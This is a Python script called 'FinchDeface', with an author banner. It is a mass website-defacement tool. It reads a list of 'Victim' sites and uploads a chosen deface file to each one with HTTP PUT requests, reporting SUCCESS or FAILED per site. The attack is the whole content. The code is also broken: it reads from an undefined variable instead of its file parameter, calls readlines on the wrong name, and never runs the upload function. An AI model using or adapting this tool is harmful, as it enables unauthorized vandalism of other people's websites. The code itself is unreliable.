#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """""

 ******** ** ****     **   ******  **      **   Author  : mr.finch99
/**///// /**/**/**   /**  **////**/**     /**   Tools   : FinchDeface
/**      /**/**//**  /** **    // /**     /**   Date    : 2019-23-07
/******* /**/** //** /**/**       /**********   Github  : /finch99
/**////  /**/**  //**/**/**       /**//////**   IG      : mr.finch99
/**      /**/**   //****//**    **/**     /**   YT      : mr.finch official
/**      /**/**    //*** //****** /**     /**   site    : https://www.mrfinchtalk.wordpress.com
//       // //      ///   //////  //      //    twitter : MFinch9                                                                                                                     
"""""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def Finch(script,target_file="Victim.txt"):
   op = open(script,"r").read()
   with open(Victim_file, "r") as target:
      Victim = Victim.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(Victim)))
      for web in Victim:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("Enter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()
